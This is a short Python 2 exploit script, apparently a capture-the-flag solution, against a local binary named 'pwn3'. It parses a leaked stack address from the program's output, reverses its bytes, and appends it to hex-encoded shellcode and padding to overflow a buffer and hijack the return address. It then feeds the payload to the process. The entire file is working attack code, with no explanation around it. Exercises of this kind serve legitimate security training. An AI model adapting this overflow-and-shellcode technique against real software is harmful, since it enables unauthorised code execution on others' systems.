import subprocess

#Recursive method to reverse hex pairs
def reverse_hex(hex):
    if(len(hex)<= 2):
        return hex
    else:
        return reverse_hex(hex[2:])+hex[0:2]

#overflow up to address
ones = "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"
payload = '53E58955E814EC83FFFFFEF718A7C381EC830000C0838D0C50FFFFE9FFFE32E810C483FF8D08EC83FFE9D383838D50FFFFFFE9D5FE59E850C483FFFFF4458910BE0F10EBEC83F34554E8500C83FFFFFEEC8310C4F475FF0CFFFDE6E810C483FF80F3458875FFF37D0CEC83D930E80A6A83FFFFFE8B9010C4C3C9FC5D69487757'


start = 0xffffd4fe

p = subprocess.Popen(["./pwn3"], stdout=subprocess.PIPE, stdin = subprocess.PIPE)
resp = p.stdout.readline()
print(resp)

#trim excess off of string
resp = resp[47:-2]
print("address: 0x" + resp)

#Reverse hex, decode as hex.
resp = reverse_hex(resp)

payload = payload + ("00"*200)

payload = payload+resp+resp
payload = payload.decode("hex")
print('payload: '+ payload)

bogus = raw_input()


p.stdin.write(payload+"\n\n\n\n")
#Recieve and print response
resp = p.stdout.readline()
print(resp)
